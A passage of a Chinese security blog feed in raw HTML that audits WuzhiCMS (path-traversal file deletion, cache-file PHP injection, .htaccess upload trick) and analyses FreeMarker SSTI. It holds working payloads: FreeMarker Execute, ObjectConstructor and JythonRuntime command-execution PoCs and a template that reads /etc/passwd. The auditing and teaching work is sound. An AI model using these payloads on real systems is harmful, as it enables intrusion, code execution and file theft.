class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在D盘下放一个1.txt文件</p><p>网站www目录路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:/phpstudy_pro/WWW/wuzhicms/www/uploadfile<br></code></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/index.php?m=attachment&amp;f=index&amp;_su=wuzhicms&amp;v=del&amp;url=http://localhost/wuzhicms/www/uploadfile/../../../../../1.txt<br></code></pre></td></tr></table></figure><p>执行后可以看到1.txt文件顺利被删除</p><p><img src="/img/wuzhicms/w16.png"></p><p>在D盘文件目录中也可以看到是被删除的</p><h4 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h4><p>www&#x2F;api&#x2F;uc.php</p><p><img src="/img/wuzhicms/w17.png"></p><p><img src="/img/wuzhicms/w18.png"></p><p>可以将uc_note类中的方法名传入action中调用方法，此类中有更改用户名，更改用户密码，删除用户等方法</p><p>此文件是可以访问的</p><p>构造url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/wuzhicms/www/api/uc.php?action=deleteuser&amp;ids=2<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w19.png"></p><p>显示无效请求</p><h4 id="后台文件上传"><a href="#后台文件上传" class="headerlink" title="后台文件上传"></a>后台文件上传</h4><p>搜索file_put_contents关键字时发现</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;/r/n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>查看是否有方法调用，方法中$data是否能作为可控变量</p><p>全局搜索关键字set_cache</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php</p><p>set方法调用了此函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>            <span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;setting&#x27;</span>]);<br>            <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$show_dialog</span> = <span class="hljs-number">1</span>;<br>            <span class="hljs-title function_ invoke__">load_class</span>(<span class="hljs-string">&#x27;form&#x27;</span>);<br>            <span class="hljs-variable">$setting</span> = &amp;<span class="hljs-variable language_">$this</span>-&gt;_cache;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$setting</span>[<span class="hljs-string">&#x27;show_mode&#x27;</span>])) &#123;<br><span class="hljs-variable">$setting</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;show_mode&#x27;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;watermark_enable&#x27;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;watermark_pos&#x27;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;watermark_text&#x27;</span>=&gt;<span class="hljs-string">&#x27;www.wuzhicms.com&#x27;</span>);<br><span class="hljs-title function_ invoke__">set_cache</span>(M, <span class="hljs-variable">$setting</span>);<br>&#125;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;set&#x27;</span>, M);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到我们传入setting的值即可</p><p>访问url抓取数据包</p><p><img src="/img/wuzhicms/w20.png"></p><p>有先前的set_cache方法可知，文件在cache&#x2F;_ cache_目录下，通过此数据包可以看到watermark的名称</p><p><img src="/img/wuzhicms/w21.png"></p><p>可以确定数据上传后保存在caches&#x2F;<em>cache</em>&#x2F;attachment.YGzFh.php路径下</p><p>修改数据包</p><p><img src="/img/wuzhicms/w22.png"></p><p>顺利上传</p><p><img src="/img/wuzhicms/w23.png"></p><p>由于是缓存文件，重启服务器就会失效</p><h4 id="后台文件上传-未成功"><a href="#后台文件上传-未成功" class="headerlink" title="后台文件上传(未成功)"></a>后台文件上传(未成功)</h4><p><a href="https://www.freebuf.com/articles/web/328241.html">文件上传之.htaccess的一些技巧 - FreeBuf网络安全行业门户</a></p><p>在寻找功能点时发现管理中心-&gt;管理会员-&gt;上传头像有文件上传</p><p>抓包查看路由</p><p><img src="/img/wuzhicms/w06.png"></p><p>找到控制代码</p><p>coreframe&#x2F;app&#x2F;attachment&#x2F;index.php -&gt;h5upload()方法</p><p><img src="/img/wuzhicms/w07.png"></p><p>发现是一个黑名单验证</p><p>跟进filename方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filename</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable">$_exts</span> =  <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;asp&#x27;</span>,<span class="hljs-string">&#x27;jsp&#x27;</span>,<span class="hljs-string">&#x27;jspx&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;htm&#x27;</span>,<span class="hljs-string">&#x27;aspx&#x27;</span>,<span class="hljs-string">&#x27;asa&#x27;</span>,<span class="hljs-string">&#x27;cs&#x27;</span>,<span class="hljs-string">&#x27;cgi&#x27;</span>,<span class="hljs-string">&#x27;js&#x27;</span>,<span class="hljs-string">&#x27;dhtml&#x27;</span>,<span class="hljs-string">&#x27;xhtml&#x27;</span>,<span class="hljs-string">&#x27;vb&#x27;</span>,<span class="hljs-string">&#x27;exe&#x27;</span>,<span class="hljs-string">&#x27;shell&#x27;</span>,<span class="hljs-string">&#x27;bat&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;pthml&#x27;</span>,<span class="hljs-string">&#x27;cdx&#x27;</span>,<span class="hljs-string">&#x27;cer&#x27;</span>);<br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$name</span>,PATHINFO_EXTENSION));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$_exts</span>)) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><span class="hljs-variable">$rand_str</span> = <span class="hljs-title function_ invoke__">random_string</span>(<span class="hljs-string">&#x27;diy&#x27;</span>, <span class="hljs-number">6</span>,<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>);<br><span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;YmdHis&#x27;</span>).<span class="hljs-variable">$rand_str</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$files</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现并没有禁止.htaccess后缀文件上传</p><p>尝试上传图片马再解析</p><p>ps：这里黑名单绕过上传php文件是不可以的，之前在安装说明处看到uploadfile文件下的php文件是禁止运行的</p><p>抓包上传一句话木马</p><p><img src="/img/wuzhicms/w08.png"></p><p>可以看到是没有文件内容检测和MIME检测的，成功上传</p><p>上传.htaccess文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;FilesMatch <span class="hljs-string">&quot;/.png&quot;</span>&gt;<br>  SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p><img src="/img/wuzhicms/w09.png"></p><p>同样可以看到是成功上传的</p><p>但是上传后是无法按照预想中执行的，文件上传之后被重命名无法更改，但是apache智慧查找.htaccess并执行</p><p>并且执行.htaccess文件需要apache httpd.conf文件中AllowOverride值为All，默认是none，这个要看运气</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol><li>翻看目录弄清楚结构，找到控制器</li><li>安装系统查看使用的依赖，模板</li><li>判断正常的传值，参数关系，路由关系</li><li>搜索关键字，找敏感函数，查看是否有可控变量，查看是否有利用点(是否有控制器中方法调用，能传参)</li></ol>]]></content>
    
    
    <categories>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CMS</tag>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SSTI</title>
    <link href="/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/"/>
    <url>/2025/07/16/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SSTI/</url>
    
    <content type="html"><![CDATA[<h2 id="FreeMarker-SSTI"><a href="#FreeMarker-SSTI" class="headerlink" title="FreeMarker SSTI"></a>FreeMarker SSTI</h2><h3 id="FreeMarket基本语法"><a href="#FreeMarket基本语法" class="headerlink" title="FreeMarket基本语法"></a>FreeMarket基本语法</h3><h4 id="插值"><a href="#插值" class="headerlink" title="插值"></a>插值</h4><p><a href="http://freemarker.foofun.cn/dgui_template_valueinsertion.html">插值 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p><p>插值的使用格式是： <code>$&#123;expression&#125;</code>，这里的 <code>expression</code> 可以是所有种类的表达式(比如 <code>$&#123;100 + x&#125;</code>)。</p><p>插值是用来给表达式插入具体值然后转换为文本(字符串)。插值仅仅可以在两种位置使用：在文本区(比如 <code>&lt;h1&gt;Hello $&#123;name&#125;!&lt;/h1&gt;</code>) 和字符串表达式(比如 <code>&lt;#include &quot;/footer/$&#123;company&#125;.html&quot;&gt;</code>)中。</p><p>需要注意的是：如果插值在文本区 (也就是说，不在字符串表达式中)，如果 <code>escape</code> 指令起作用了，那么将被插入的字符串会被自动转义。</p><h4 id="FTL指令"><a href="#FTL指令" class="headerlink" title="FTL指令"></a>FTL指令</h4><p><a href="http://freemarker.foofun.cn/dgui_template_directives.html">指令 - FreeMarker 中文官方参考手册 (foofun.cn)</a></p><p>使用&lt;# 指令 &gt;</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">eg. &lt;#local name=value&gt;<br></code></pre></td></tr></table></figure><h3 id="FreeMarker-SSTI-成因与攻击面"><a href="#FreeMarker-SSTI-成因与攻击面" class="headerlink" title="FreeMarker SSTI 成因与攻击面"></a>FreeMarker SSTI 成因与攻击面</h3><p>SSTI 的攻击面是模板引擎的渲染，要让 Web 服务器将 HTML 语句渲染为模板引擎，前提是要先有 HTML 语句。</p><p>将 HTML 语句放到服务器上有两种方法：</p><ul><li>1、文件上传 HTML 文件。</li><li>2、若某 CMS 自带有模板编辑功能(常见)</li></ul><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>这里使用Drunkbaby的漏洞项目：</p><p><a href="https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity">JavaSecurityLearning&#x2F;JavaSecurity at main · Drun1baby&#x2F;JavaSecurityLearning (github.com)</a></p><p>构造payload</p><p>freemarker.template.utility.Execute类中存在命令执行方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;Calc&quot;</span>)&#125;<br></code></pre></td></tr></table></figure><p>此项目没有写漏洞入口，所以利用时只能将payload直接插入.ftl中</p><p><img src="/img/ssti(java)/ssti01.png"></p><p>成功执行</p><p><img src="/img/ssti(java)/ssti02.png"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>下一个断点在 <code>org.springframework.web.servlet.view.UrlBasedViewResolver#createView</code>，开始调试</p><p> <code>createView(String viewName, Locale locale)</code> 方法，用于创建视图对象(View)，它根据逻辑视图名的前缀，判断应该创建哪种类型的视图：重定向、转发，或默认处理方式。</p><p>在此处下断点是因为MVC 加载流程是从视图解析器到模板引擎，createView-&gt;loadView()-&gt;buildView()，buildView()方法开始有模板引擎参与</p><p><img src="/img/ssti(java)/ssti03.png"></p><p>参考此文章：<a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Java模版引擎注入（SSTI）漏洞研究 - 郑瀚 - 博客园 (cnblogs.com)</a></p><p>如果对代码结构以及其中的类和方法了解不够透彻，可以直接在代码最后一步下断点，此漏洞是在命令执行方法处(freemarker&#x2F;template&#x2F;utility&#x2F;Execute.class类的exec方法下断点)，查看调用栈，判断触发ftl风险代码的调用栈从 哪里开始，再逐步分析</p><p>下断点后可以看到触发ftl风险代码的调用栈是从FreeMarkerview类的processTemplate方法开始的</p><p><img src="/img/ssti(java)/ssti04.png"></p><p>根据调用栈跟进代码执行流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span>:75, Execute (freemarker.template.utility)<br>_eval:62, MethodCall (freemarker.core)<br><span class="hljs-built_in">eval</span>:101, Expression (freemarker.core)<br>calculateInterpolatedStringOrMarkup:100, DollarVariable (freemarker.core)<br>accept:63, DollarVariable (freemarker.core)<br>visit:334, Environment (freemarker.core)<br>visit:340, Environment (freemarker.core)<br>process:313, Environment (freemarker.core)<br>process:383, Template (freemarker.template)<br></code></pre></td></tr></table></figure><p>在开始处下断点进行调试</p><p><img src="/img/ssti(java)/ssti05.png"></p><p>processTemplate-&gt;process()-&gt;visit()-&gt;pushElement()-&gt;element.accept()-&gt;getChildBuffer()-&gt;write()</p><p>process() 方法是做了一个输出（生成） HTML 文件或其他文件的工作，相当于渲染的最后一步了。</p><p>在 process() 方法中，会对 ftl 的文件进行遍历，读取一些信息，下面我们先说对于正常语句的处理，再说对于 ftl 表达式的处理。</p><p>在读取到每一条 freeMarker 表达式语句的时候，会二次调用 <code>visit()</code> 方法，</p><p><img src="/img/ssti(java)/ssti06.png"></p><p>而 visit() 方法又调用了 element.accept()，</p><p><img src="/img/ssti(java)/ssti07.png"></p><p>此处代码执行十分复杂，，建议直接根据刚才所看调用栈跟进函数更加清晰明了，不要一直动态调试步入</p><p>根据调用栈转到DollarVariable类accept方法，可以看到调用了calculateInterpolatedStringOrMarkup方法</p><p><img src="/img/ssti(java)/ssti08.png"></p><p>跟进calculateInterpolatedStringOrMarkup方法，该方法做的业务是将模型强制为字符串或标记</p><p><img src="/img/ssti(java)/ssti09.png"></p><p>跟进eval方法，可以看到eval函数对constantValue的值做了简单的判断，判定值为空后跟进 <code>this._eval()</code><img src="/img/ssti(java)/ssti10.png"></p><p>一般的 <code>_eval()</code> 方法只是将 evn 获取一下,如下图</p><p>这是通过DollarVariable类accept方法-&gt;eval方法-&gt;_eval方法</p><p><img src="/img/ssti(java)/ssti16.png"></p><p>但是这里的element的值是图中所示，可以从此处开始动态调试</p><p><img src="/img/ssti(java)/ssti11.png"></p><p>append会调用assign类中的append方法做了一系列基础判断，先判断 <code>namespaceExp</code> 是否为 null，接着又判断 <code>this.operatorType </code>是否等于 65536</p><p><img src="/img/ssti(java)/ssti12.png"></p><p>看到此处获取valueEXP，跟进eval方法</p><p><img src="/img/ssti(java)/ssti13.png"></p><p>eval函数中判断constantValue值为空后，跟进_eval方法</p><p>经过一系列复杂的代码可以看到 <code>targetMethod</code> 目前就是我们在 ftl 语句当中构造的那个能够进行命令执行的类</p><p><img src="/img/ssti(java)/ssti15.png"></p><p>此时这一个语句相当于</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> targetMethod.exec(argumentStrings);<br><span class="hljs-comment">// 等价于</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> freemarker.template.utility.Execute.exec(argumentStrings);<br></code></pre></td></tr></table></figure><p>而这一步并非直接进行命令执行，而是先把这个类通过 <code>newInstance()</code> 的方式进行初始化。</p><p>命令执行的参数，会被拿出来，在下一次的同样流程中作为命令被执行，如图</p><p><img src="/img/ssti(java)/ssti17.png"></p><p>至此，漏洞代码分析结束。</p><p>ai了一下_eval代码的含义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplateModel <span class="hljs-title function_">_eval</span><span class="hljs-params">(Environment env)</span> <span class="hljs-keyword">throws</span> TemplateException &#123;<br>    <span class="hljs-type">TemplateModel</span> <span class="hljs-variable">targetModel</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.target.eval(env);<br></code></pre></td></tr></table></figure><p>定义一个 <code>_eval</code> 方法，返回一个 <code>TemplateModel</code>（FreeMarker 中的通用模型类型）。</p><p>调用 <code>this.target.eval(env)</code> 解析出当前要执行的目标对象（可能是方法或变量），并赋值给 <code>targetModel</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (targetModel <span class="hljs-keyword">instanceof</span> TemplateMethodModel) &#123;<br>    <span class="hljs-type">TemplateMethodModel</span> <span class="hljs-variable">targetMethod</span> <span class="hljs-operator">=</span> (TemplateMethodModel) targetModel;<br></code></pre></td></tr></table></figure><p>如果目标是一个模板方法（<code>TemplateMethodModel</code>），就将其强制类型转换为 <code>targetMethod</code>。</p><p>此段代码会判断element中的值是方法还是参数，对应传给不同变量，以确保命令的正确拼接</p><h3 id="FreeMarker-SSTI-的攻防二象性"><a href="#FreeMarker-SSTI-的攻防二象性" class="headerlink" title="FreeMarker SSTI 的攻防二象性"></a>FreeMarker SSTI 的攻防二象性</h3><p>现在使用的poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;Calc&quot;)&#125;<br></code></pre></td></tr></table></figure><p>这是 FreeMarker 的内置函数 new 导致的，下面简单介绍一下 FreeMarker的两个内置函数—— <code>new</code> 和 <code>api</code></p><h4 id="内置函数-new"><a href="#内置函数-new" class="headerlink" title="内置函数 new"></a>内置函数 new</h4><p>可创建任意实现了 <code>TemplateModel</code> 接口的 Java 对象，同时还可以触发没有实现 <code>TemplateModel</code> 接口的类的静态初始化块。<br>以下两种常见的FreeMarker模版注入poc就是利用new函数，创建了继承 <code>TemplateModel</code> 接口的 <code>freemarker.template.utility.JythonRuntime</code> 和<code>freemarker.template.utility.Execute</code></p><h4 id="API"><a href="#API" class="headerlink" title="API"></a>API</h4><p><code>value?api</code> 提供对 value 的 API（通常是 Java API）的访问，例如 <code>value?api.someJavaMethod()</code> 或 <code>value?api.someBeanProperty</code>。可通过 <code>getClassLoader</code>获取类加载器从而加载恶意类，或者也可以通过 <code>getResource</code>来实现任意文件读取。<br>但是，当<code>api_builtin_enabled</code>为 true 时才可使用 api 函数，而该配置在 <strong>2.3.22 版本</strong>之后默认为 false。</p><ul><li>由此我们可以构造出一系列的 bypass PoC</li></ul><p>POC1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign classLoader=object?api.class.protectionDomain.classLoader&gt; <br>&lt;#assign clazz=classLoader.loadClass(<span class="hljs-string">&quot;ClassExposingGSON&quot;</span>)&gt; <br>&lt;#assign field=clazz?api.getField(<span class="hljs-string">&quot;GSON&quot;</span>)&gt; <br>&lt;#assign gson=field?api.get(<span class="hljs-literal">null</span>)&gt; <br>&lt;#assign ex=gson?api.fromJson(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, classLoader.loadClass(<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>))&gt; <br>$&#123;ex(<span class="hljs-string">&quot;Calc&quot;</span><span class="hljs-string">&quot;)&#125;</span><br></code></pre></td></tr></table></figure><p>POC2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.ObjectConstructor&quot;</span>?<span class="hljs-keyword">new</span>()&gt;$&#123;value(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>).start()&#125;<br></code></pre></td></tr></table></figure><p>POC3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign value=<span class="hljs-string">&quot;freemarker.template.utility.JythonRuntime&quot;</span>?<span class="hljs-keyword">new</span>()&gt;&lt;<span class="hljs-meta">@value</span>&gt;<span class="hljs-keyword">import</span> os;os.system(<span class="hljs-string">&quot;calc&quot;</span>)<br></code></pre></td></tr></table></figure><p>POC4</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign ex=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?<span class="hljs-keyword">new</span>()&gt; $&#123; ex(<span class="hljs-string">&quot;Calc&quot;</span>) &#125;<br></code></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign is=object?api.class.getResourceAsStream(<span class="hljs-string">&quot;/Test.class&quot;</span>)&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;#assign uri=object?api.class.getResource(<span class="hljs-string">&quot;/&quot;</span>).toURI()&gt;<br>&lt;#assign input=uri?api.create(<span class="hljs-string">&quot;file:///etc/passwd&quot;</span>).toURL().openConnection()&gt;<br>&lt;#assign is=input?api.getInputStream()&gt;<br>FILE:[&lt;#list <span class="hljs-number">0.</span><span class="hljs-number">.999999999</span> as _&gt;<br>    &lt;#assign <span class="hljs-type">byte</span>=is.read()&gt;<br>    &lt;#<span class="hljs-keyword">if</span> <span class="hljs-type">byte</span> == -<span class="hljs-number">1</span>&gt;<br>        &lt;#<span class="hljs-keyword">break</span>&gt;<br>    &lt;/#<span class="hljs-keyword">if</span>&gt;<br>$&#123;<span class="hljs-type">byte</span>&#125;, &lt;/#list&gt;]<br></code></pre></td></tr></table></figure><h4 id="修复和防御"><a href="#修复和防御" class="headerlink" title="修复和防御"></a>修复和防御</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Configuration</span> <span class="hljs-variable">cfg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 